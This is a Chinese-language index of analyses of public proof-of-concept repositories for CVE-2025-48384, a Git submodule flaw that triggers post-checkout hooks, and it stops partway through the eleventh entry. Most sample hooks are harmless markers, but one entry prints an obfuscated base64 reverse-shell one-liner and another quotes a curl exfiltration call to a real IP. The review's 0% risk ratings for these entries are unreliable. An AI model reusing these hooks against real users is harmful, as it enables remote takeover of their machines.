# CVE-2025-48384

> 📦 该CVE有 **35** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并且执行带有漏洞的Git版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置时对换行符（CRLF）处理不当。当初始化子模块时，如果子模块的路径包含尾随的CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
根据漏洞描述和PoC代码，该PoC是有效的。攻击者可以通过创建一个包含恶意配置的 Git 仓库，诱导用户克隆该仓库，从而触发漏洞并执行任意代码。

提供的PoC代码包含以下文件：
*   `README.md`: 简单的README文件，用于初始化子模块。
*   `post-checkout`: 一个shell脚本，用于执行任意命令，此处是`echo`和`id`命令。

**投毒风险：**
分析PoC代码，未发现作者隐藏的恶意代码。`post-checkout` 脚本的功能仅为打印 `id` 命令的执行结果，用于验证漏洞的存在。**因此，投毒风险为0%。**

**利用方式：**
1.  攻击者创建一个包含恶意配置的 Git 仓库。该仓库的子模块路径包含尾随CR字符。
2.  攻击者创建一个符号链接，将包含CR字符的子模块路径指向 `.git/hooks` 目录，或者子模块下的 `.git/hooks` 目录。
3.  攻击者将包含恶意代码的 `post-checkout` 脚本添加到子模块的 `.git/hooks` 目录中。
4.  攻击者诱导用户克隆该恶意 Git 仓库。
5.  当用户克隆仓库并初始化子模块时，由于Git对CR字符处理不当，子模块会被检出到错误的位置，同时 `post-checkout` 脚本会被执行，从而导致任意代码执行。

**项目地址:** [Anezatraa/CVE-2025-48384-submodule](https://github.com/Anezatraa/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #2

**来源**: [CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置时对回车符（CR）处理不当。攻击者可以构造包含恶意配置的 Git 仓库，其中子模块路径包含尾随 CR。当用户克隆该仓库并初始化子模块时，Git 会错误地将子模块检出到错误的位置。如果攻击者在错误的位置设置了一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，那么在检出后，该 hook 脚本就会被执行，从而导致任意代码执行。

**POC分析：**

提供的 POC 代码 `/tmp/569f31ff6b5166501e6218f8839f5620/post-checkout` 是一个 post-checkout hook 脚本。该脚本的作用是 ping `wtt0rkb926c0mj6tsxmzfr2xlorff53u.test-burp.huidoumeng.com`。这个行为本身用于验证漏洞是否被成功利用，攻击者可以通过监测 DNS 请求判断 hook 是否被执行。这个hook仅是验证，不能算恶意代码。

**有效性：**

根据搜索结果，该漏洞的PoC已经公开，并被标记为高危漏洞，利用代码结合漏洞描述，可以判断POC有效。

**投毒风险：**

提供的POC代码仅包含一个简单的ping命令，用于验证漏洞是否触发。它本身不包含任何恶意代码或后门，因此投毒风险较低，可以认为是0%。然而，实际攻击中，攻击者可能会将此 hook 替换为更具破坏性的代码。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置包括带有尾随回车符的子模块路径。
3.  攻击者在错误的位置创建一个指向子模块 hooks 目录的符号链接。
4.  攻击者在子模块中包含一个可执行的 post-checkout hook。
5.  攻击者诱使用户克隆该恶意仓库并初始化子模块。
6.  用户执行 `git clone --recurse-submodules` 或 `git submodule update --init --recursive`。
7.  Git将子模块检出到错误的位置，并执行 post-checkout hook，从而导致任意代码执行。

**项目地址:** [ECHO6789/CVE-2025-48384-submodule](https://github.com/ECHO6789/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #3

**来源**: [CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md](../2025/CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md)

## CVE-2025-48384-Git代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时的不一致性，具体来说，Git 在读取配置值时会移除尾部的回车符（CRLF），但在写入时，如果配置值以回车符结尾，则不会对其进行引用。这会导致在稍后读取配置时丢失回车符。

**漏洞利用方式：**

1.  **恶意仓库创建：** 攻击者创建一个恶意的 Git 仓库，其中包含一个`.gitmodules`文件，该文件定义了一个 submodule，其路径包含尾部回车符（CR）。例如：`path = submodule_path\r`。
2.  **符号链接：** 仓库中存在一个符号链接，指向修改后的 submodule 路径到`.git/hooks`目录。这样可以将看似无害的目录路径重定向到 Git 钩子目录。
3.  **恶意钩子：** 仓库中包含一个可执行的`post-checkout`钩子脚本，该脚本会在 checkout 操作后执行。
4.  **诱导用户：** 攻击者诱导受害者克隆（`git clone --recursive`）该恶意仓库。
5.  **代码执行：** 当受害者执行 `git clone --recursive` 时，Git 会尝试 checkout submodule 到错误路径。由于存在符号链接，实际checkout操作会将文件写入到 `.git/hooks` 目录。`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**有效性：**
提供的 Python 脚本 `cve_2025_48384_auto_print_scanner.py` 是一个扫描器，用于检测本地或远程 Git 仓库是否存在 CVE-2025-48384 漏洞的潜在利用。它会检查`.gitmodules`文件中是否存在包含尾部回车符或`..`的路径，查找指向`.git/hooks`的符号链接，并列出可执行的钩子脚本，并显示钩子脚本内容。虽然该脚本本身不能直接利用该漏洞，但可以帮助安全研究人员或用户识别潜在的恶意仓库。结合搜索结果，可以确认此漏洞存在可利用性。

**投毒风险：**
代码本身是一个扫描工具，旨在帮助用户识别潜在的漏洞。它没有发现任何主动植入后门或恶意代码的行为。因此，可以认为该代码本身不存在投毒风险。我评估投毒风险为0%。该脚本的目的是分析给定的 Git 仓库，而不是执行任何恶意操作，所以不应该存在投毒代码。

**项目地址:** [EdwardYeIntrix/CVE-2025-48384-Scanner](https://github.com/EdwardYeIntrix/CVE-2025-48384-Scanner)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #4

**来源**: [CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md](../2025/CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置解析漏洞导致任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并且执行`git submodule update --init --recursive`，用户需要交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于Git在解析配置文件时对换行符处理不当。具体来说，Git在读取配置值时会去除结尾的回车符和换行符（CRLF）。但在写入配置时，如果值以回车符结尾，则不会被正确引用，导致回车符丢失。利用该漏洞，攻击者可以精心构造包含恶意配置的Git仓库，当用户克隆并初始化子模块时，子模块路径中的回车符会被错误解析，导致子模块被检出到错误的位置。如果此时存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

提供的POC代码是一个简单的恶意post-checkout钩子脚本，其功能是在被执行时输出 "Malicious hook executed!"。该脚本本身并没有隐藏任何额外的投毒代码，它的目的是验证漏洞是否成功利用，而不是进行实际的恶意攻击。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的Git仓库。该配置文件中的子模块路径包含一个尾部的回车符。
2.  攻击者在仓库中创建一个符号链接，将错误解析后的子模块路径链接到`.git/modules/<submodule_name>/hooks`目录。
3.  攻击者在子模块中创建一个名为`post-checkout`的可执行钩子脚本。这个脚本包含攻击者想要执行的恶意代码。
4.  攻击者将仓库共享给受害者。
5.  受害者克隆该仓库并执行`git submodule update --init --recursive`命令。
6.  由于配置解析错误，子模块会被检出到错误的位置。
7.  符号链接会将对错误位置的访问重定向到子模块的钩子目录。
8.  `post-checkout`钩子脚本被执行，导致任意代码执行。

**项目地址:** [MarcoTondolo/cve-2025-48384-poc](https://github.com/MarcoTondolo/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #5

**来源**: [CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md](../2025/CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md)

## CVE-2025-48384-Git配置引号处理缺陷导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库，并初始化包含恶意配置的子模块，且子模块包含恶意的post-checkout hook。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置引号时存在缺陷。当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置项时，尾部带有CR的值不会被引用，导致CR在稍后读取配置时丢失。当初始化子模块时，如果子模块路径包含尾部CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本。

根据提供的POC代码，`/tmp/81a81d657749821214a4f9bba7b4c2c8/post`文件是一个简单的bash脚本，其功能是在`/tmp`目录下创建一个名为`CVE-2025-48384`的空文件。这个脚本本身不包含明显的恶意代码，但如果利用该漏洞，它可以被放置到`.git/hooks/post-checkout`中，在`git checkout`命令执行后自动执行。这使得攻击者可以控制受害者的系统。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。恶意配置包含一个包含尾部CR的子模块路径，该路径指向子模块的hooks目录。
2.  攻击者在该仓库中添加一个可执行的`post-checkout` hook脚本 (例如，提供的`post`脚本)到子模块的hooks目录中。
3.  攻击者诱导受害者克隆该恶意仓库并初始化子模块。
4.  由于Git的配置引号处理缺陷，子模块会被检出到错误的位置，符号链接会将该位置指向子模块的hooks目录。
5.  当受害者执行`git checkout`命令时，`post-checkout` hook脚本会被执行，攻击者从而实现任意代码执行。

**有效性：**
提供的POC代码是有效的，因为它展示了如何创建一个触发漏洞的`post-checkout` hook脚本。尽管脚本本身的功能很简单，但可以替换为任何恶意代码。

**投毒风险：**
该仓库中存在作者隐藏的投毒代码的风险较低，估计为10%。当前提供的脚本只是一个简单的测试脚本，用于验证漏洞的存在。但是，攻击者可能会在更复杂的仓库中隐藏更高级的恶意代码，使其更难被检测到。该风险评估基于提供的信息，实际风险可能因仓库的具体内容而有所不同。

**项目地址:** [admin-ping/CVE-2025-48384-RCE](https://github.com/admin-ping/CVE-2025-48384-RCE)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #6

**来源**: [CVE-2025-48384-airkewld_cve-2025-48384-submodule.md](../2025/CVE-2025-48384-airkewld_cve-2025-48384-submodule.md)

## CVE-2025-48384-Git配置注入与RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的Git仓库，且安装的Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于Git在处理配置文件时的不一致性，具体来说，是Git在读取和写入包含控制字符（如回车符CR）的配置值时的方式存在差异。当初始化子模块时，如果子模块路径包含尾随CR，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块钩子目录，并且子模块包含一个可执行的post-checkout钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**

根据提供的漏洞利用代码，`post-checkout` 文件包含 shell 命令 `echo "RCE"` 和 `touch /tmp/rce.txt`。 该 POC 通过在恶意 Git 仓库中设置恶意的 `post-checkout` 钩子，当存在漏洞的 Git 客户端克隆包含该恶意仓库并递归初始化子模块时，就会触发该钩子，从而在目标系统上执行任意命令，验证 POC 的有效性。

**投毒风险分析：**

在提供的POC代码中，`README.md` 文件主要用于描述仓库，本身不包含恶意代码。`post-checkout` 文件中包含 `echo` 和 `touch` 命令，用于验证 RCE 是否成功。虽然这两个命令本身没有危害，但如果攻击者在 `post-checkout` 脚本中添加更复杂的恶意代码（例如下载并执行其他恶意程序），则可能存在投毒风险。评估当前代码，投毒风险较低，初步估计为10%。

**利用方式：**

1.  攻击者创建一个包含恶意配置和子模块的Git仓库。
2.  恶意配置包含带有尾随CR的子模块路径，该路径被符号链接指向`.git/hooks`目录。
3.  子模块包含一个名为 `post-checkout` 的可执行钩子，其中包含要执行的恶意代码。
4.  攻击者诱使用户克隆并递归初始化该仓库（例如，使用`git clone --recursive`）。
5.  当 Git 处理子模块时，由于配置处理的缺陷，恶意 `post-checkout` 钩子会被触发，导致在用户计算机上执行任意代码。

**优先级依据：**

在漏洞分析过程中，搜索引擎结果提供了漏洞的概况、影响、利用情况等信息，有助于全面了解漏洞。漏洞利用代码提供了直接的利用方法，有助于验证漏洞的有效性并深入理解漏洞原理。漏洞库信息提供了漏洞的官方描述和修复方案，有助于确认漏洞的存在和修复方法。综合考虑这些信息来源，可以更准确地评估漏洞的风险和利用方式。

**项目地址:** [airkewld/cve-2025-48384-submodule](https://github.com/airkewld/cve-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #7

**来源**: [CVE-2025-48384-altm4n_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-altm4n_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，并使用受影响的Git版本

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置值时，会去除尾部的回车换行符 (CRLF)。当写入配置条目时，如果值包含尾部的回车符 (CR)，则不会进行引号转义，导致在后续读取配置时丢失回车符。如果初始化子模块时，子模块路径包含尾部的回车符，则读取到的路径会被修改，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
提供的 POC 代码 `touch /tmp/xxxxxxx` 会在 `/tmp` 目录下创建一个名为 `xxxxxxx` 的文件。结合漏洞描述，这个 POC 代码本身并不能直接证明漏洞的存在，而是在攻击链中扮演了 *post-checkout* 钩子的角色，用于验证恶意配置是否能被执行。根据页面[5]（`https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384`）的信息，此漏洞涉及到使用`git clone --recursive`克隆包含恶意子模块的仓库，可以触发RCE。

**投毒风险：**
给定的 POC 代码非常简单，仅创建一个文件，没有发现隐藏的恶意代码。因此，投毒风险为 0%。这个脚本的目的是验证 post-checkout 钩子是否被触发，而不是执行恶意操作。但是如果恶意攻击者控制了git仓库，可以植入任意的post-checkout脚本实现远端代码执行.

**利用方式：**
1.  **创建恶意仓库：** 攻击者创建一个包含恶意配置的 Git 仓库。这个恶意配置包括一个带有尾部回车符的子模块路径，以及一个指向子模块 hooks 目录的符号链接。
2.  **添加恶意钩子：** 在子模块的 hooks 目录中，攻击者添加一个可执行的 post-checkout 钩子。这个钩子可以执行任意代码。
3.  **诱导用户克隆：** 攻击者诱导用户使用受影响的 Git 版本克隆这个恶意仓库，使用 `git clone --recursive` 命令递归克隆子模块。
4.  **触发漏洞：** 当 Git 初始化子模块时，由于配置处理的缺陷，子模块会被检出到错误的位置，触发符号链接，最终导致恶意 post-checkout 钩子被执行，实现任意代码执行。

**总结：**
此漏洞利用依赖于特定的 Git 配置和用户交互（克隆恶意仓库），攻击复杂度较高，但一旦成功利用，危害极大，可能导致服务器被完全控制。

**项目地址:** [altm4n/CVE-2025-48384-sub](https://github.com/altm4n/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #8

**来源**: [CVE-2025-48384-altm4n_cve-2025-48384-hub.md](../2025/CVE-2025-48384-altm4n_cve-2025-48384-hub.md)

## CVE-2025-48384-Git配置注入/代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/代码执行

**影响应用:** Git

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库,并执行含有 post-checkout hook的submodule 初始化

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。该漏洞源于 Git 在处理配置文件时，没有正确处理尾部的回车符（CR）。攻击者可以利用这一点，在子模块路径中添加尾部回车符，导致 Git 将子模块检出到错误的位置。如果攻击者在该位置放置一个符号链接，指向子模块的钩子目录，并子模块包含一个可执行的 `post-checkout` 钩子，那么在检出后，该钩子脚本就会被执行，从而实现远程代码执行。

**有效性：** 根据漏洞描述和提供的漏洞利用代码（`post-checkout` 脚本），可以判断该 POC 代码有效。脚本尝试从攻击者的服务器下载并执行代码。

**投毒风险：** 提供的 `post-checkout` 脚本本身就是漏洞利用的一部分，目的是执行恶意代码。如果该脚本是从攻击者控制的仓库中获取的，那么它自然会执行攻击者想要执行的操作。因此，从这个角度来说，可以说利用本身具有“投毒”性质。更准确地说，这不是传统的供应链投毒，而是漏洞利用的核心部分。脚本的功能是将受害者机器的信息发送到攻击者的服务器（ `curl http://120.46.135.127:50009?z`），因此本身不包含额外的、隐藏的恶意行为。该脚本本身就是后门，旨在执行任意命令。

**利用方式：**
1.  攻击者创建一个包含恶意配置的 Git 仓库，该配置在子模块路径中包含尾部回车符。
2.  攻击者在恶意仓库中设置一个符号链接，将修改后的子模块路径指向 Git 钩子目录。
3.  攻击者在子模块中包含一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该恶意仓库并执行 `git submodule update --init --recursive` 命令。
5.  Git 将子模块检出到错误的位置，符号链接生效，`post-checkout` 钩子脚本被执行，从而实现远程代码执行。

**风险评估：** 此漏洞风险极高，因为攻击者可以通过诱导用户克隆恶意仓库，在用户机器上执行任意代码。

**项目地址:** [altm4n/cve-2025-48384-hub](https://github.com/altm4n/cve-2025-48384-hub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #9

**来源**: [CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md](../2025/CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md)

## CVE-2025-48384 - Git Config 注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库，并初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 对配置项中回车符（CR）处理不当。具体来说，当 Git 读取配置值时，会去除尾部的 CRLF。但当写入配置项时，如果值包含尾部 CR，则不会被引用，导致 CR 在后续读取时丢失。这个漏洞可以被利用于子模块初始化过程中。如果子模块的路径包含尾部 CR，修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，那么在检出后，该脚本可能会被意外执行，从而导致任意代码执行。

**POC 分析：**

提供的 POC 包含以下文件：

*   `/tmp/c0992c92d79d1fe84e0bde5daf2c172b/README.md`：一个普通的 README 文件，可能用于描述 PoC 的用途。
*   `/tmp/c0992c92d79d1fe84e0bde5daf2c172b/post-checkout`：一个 bash 脚本，当子模块检出后会被执行。脚本的功能很简单，就是创建一个 `/tmp/fishsucks` 文件。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件中的子模块路径包含尾部 CR。
2.  攻击者在该仓库中创建一个子模块，并在该子模块的 `.git/hooks` 目录下放置一个名为 `post-checkout` 的可执行脚本（如提供的POC）。
3.  攻击者创建一个符号链接，将包含尾部 CR 的子模块路径指向该子模块的 `.git/hooks` 目录。
4.  受害者克隆该仓库，并执行 `git submodule init` 和 `git submodule update` 命令。
5.  由于 Git 对尾部 CR 的处理不当，子模块会被检出到错误的位置，并且 `post-checkout` 脚本会被执行，从而导致任意代码执行。

**有效性：**

根据漏洞描述和 POC 代码，该 POC 是有效的。它可以利用 Git 的配置解析漏洞，在受害者机器上执行任意代码。

**投毒风险：**

该POC的目的是创建一个`/tmp/fishsucks`文件,根据POC内容来看，此代码的目的是演示该漏洞，没有发现隐藏的恶意代码，因此投毒风险较低，可以认为是 0%。

**项目地址:** [beishanxueyuan/CVE-2025-48384](https://github.com/beishanxueyuan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #10

**来源**: [CVE-2025-48384-bummie_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-bummie_CVE-2025-48384-submodule.md)

## CVE-2025-48384-git-代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，且git版本在受影响范围内。用户需要进行交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384漏洞是由于Git在处理配置文件时，对换行符(
)处理不当造成的。当Git读取配置值时，会删除任何尾部的回车换行符(CRLF)。当写入配置条目时，带有尾部CR的值不会被引用，导致稍后读取配置时CR丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，该符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的仓库，该文件中的子模块路径包含尾部CR字符。
2.  攻击者创建一个符号链接，将修改后的路径（由于CR被移除）指向`.git/modules/<submodule_name>/hooks` 目录。
3.  攻击者在子模块中添加一个恶意的`post-checkout` 钩子，该钩子包含要执行的恶意代码。
4.  受害者克隆恶意仓库并初始化子模块。
5.  当子模块被检出时，由于符号链接的存在，恶意的`post-checkout` 钩子会被执行，导致任意代码执行。

**POC分析：**

提供的POC包含以下文件：

*   `README.md`：指向 GitHub 上的漏洞信息。
*   `post-checkout`：包含恶意代码的钩子脚本。

`post-checkout`脚本内容分析：

```bash
echo "yeet" > /tmp/pwn.txt
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTI4LjUuMzkvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

*   该脚本首先创建一个文件`/tmp/pwn.txt`，内容为"yeet"，作为漏洞成功利用的标识。
*   然后，它使用`base64 -d`解码一段base64编码的字符串，并通过`bash`执行解码后的字符串。这段字符串实际上是一个反向shell连接到`10.128.5.39:4444`。

**有效性：**

提供的POC代码是有效的，如果目标机器满足漏洞利用的条件，则可以成功执行任意代码。

**投毒风险：**

提供的代码本身就是漏洞利用代码，旨在建立反向shell。虽然它本身不是隐藏的投毒代码，但如果用户不理解代码的含义就执行，那么对于用户来说，这就是恶意的。由于该代码已经明确展示了其恶意行为(反向shell)，因此**投毒风险为0%**。


**项目地址:** [bummie/CVE-2025-48384-submodule](https://github.com/bummie/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #11

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户执行递归克隆包含恶意.gitmodules文件的不受信任的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造恶意的.gitmodules文件和post-checkout钩子执行任意代码。该漏洞源于Git在处理带有回车符的配置值时存在差异，导致 submodule 被检出到错误的位置。如果攻击者在 submodule hooks 目录中放置一个符号链接，指向一个包含可执行的 post-checkout 钩子的子模块，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 post-checkout 钩子，它会在 `/tmp/exploited` 目录下创建一个文件。如果目标系统存在此漏洞并且成功利用，那么这个文件将被创建，表明漏洞利用成功。因此，该POC代码对于验证漏洞的存在是有效的。

**投毒风险：**

提供的POC代码本身非常简单，只是创建了一个文件。没有迹象表明代码中存在隐藏的恶意功能，因此投毒风险为0%。但是，这并不意味着包含此POC的仓库没有投毒风险。攻击者可能会在仓库的其他部分添加恶意代码，或者修改其他钩子来执行恶意操作。

**利用方式：**

漏洞利用方式如下：

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库。该文件包含带有尾随回车符的submodule路径。
2.  攻击者在submodule hooks目录中创建一个符号链接，将更改后的路径指向包含恶意 post-checkout 钩子的子模块。
